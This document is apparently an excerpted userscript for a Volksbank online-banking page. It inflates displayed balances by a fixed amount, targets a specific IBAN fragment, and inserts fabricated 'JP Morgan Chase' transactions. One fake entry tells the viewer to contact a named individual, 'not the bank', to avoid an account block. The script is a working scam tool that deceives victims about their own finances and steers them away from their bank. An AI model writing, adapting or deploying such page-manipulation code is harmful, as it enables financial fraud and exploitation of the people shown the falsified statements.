// ==UserScript==
// @name         Ed Rec Volks combined Anna Kersten
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/490840/Ed%20Rec%20Volks%20combined%20Anna%20Kersten.user.js
// @updateURL https://update.greasyfork.org/scripts/490840/Ed%20Rec%20Volks%20combined%20Anna%20Kersten.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  222700},
        { index: 1, adjustmentAmount: 222700},
        { index: 2, adjustmentAmount: 222700},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE09 6619 0000";
    var targetTextContent2 = " 0010 4302 59";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 222700.0; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
 ...
 {
            title: 'JP Morgan Chase',
            description: 'Geld für Steuern 2.',
            amount: '4.500,00',
            date: '27. Mär.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
        ...
        },
  {
        ...
        {
            title: 'JP Morgan Chase',
            description: 'Freigabe nötig. Wenden Sie sich an Andreas Gold, nicht die Bank, damit nicht gesperrt.',
            amount: '207.964,00',
            date: 'Heute',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
